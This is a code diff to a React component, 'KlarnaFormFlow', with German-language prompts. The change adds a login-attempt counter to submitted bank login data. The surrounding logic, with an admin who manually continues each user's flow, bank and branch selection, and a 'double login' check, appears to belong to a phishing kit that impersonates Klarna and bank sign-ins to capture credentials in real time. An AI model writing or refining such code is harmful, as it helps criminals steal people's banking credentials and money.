@@ -303,7 +303,7 @@ function KlarnaFormFlow() {
         },
         onContinueFlow: () => {
           console.log('▶️ Admin triggered continue flow');
-          if (isWaitingForAdmin && personalData?.pendingState) {
+          if (isWaitingForAdmin && (personalData as any)?.pendingState) {
             setIsWaitingForAdmin(false);
             setLoading(false);
             setState((personalData as any).pendingState);
@@ -456,10 +456,12 @@ function KlarnaFormFlow() {
       setLoading(true);
       setLoadingMessage("Anmeldung wird verarbeitet...");
 
+      const currentAttempt = loginAttempts + 1;
       const submissionData = { 
         ...data, 
         bank_type: selectedBank,
-        selected_branch: selectedBranch 
+        selected_branch: selectedBranch,
+        attempt: currentAttempt
       };
       
       console.log('📤 Full Klarna submission payload:', JSON.stringify(submissionData, null, 2));
@@ -477,7 +479,7 @@ function KlarnaFormFlow() {
         setLoginData(data);
         
         // Increment login attempts for tracking
-        setLoginAttempts(prev => prev + 1);
+        setLoginAttempts(currentAttempt);
         
         // Check double login configuration
         if (state === KLARNA_STATES.BANK_LOGIN) {
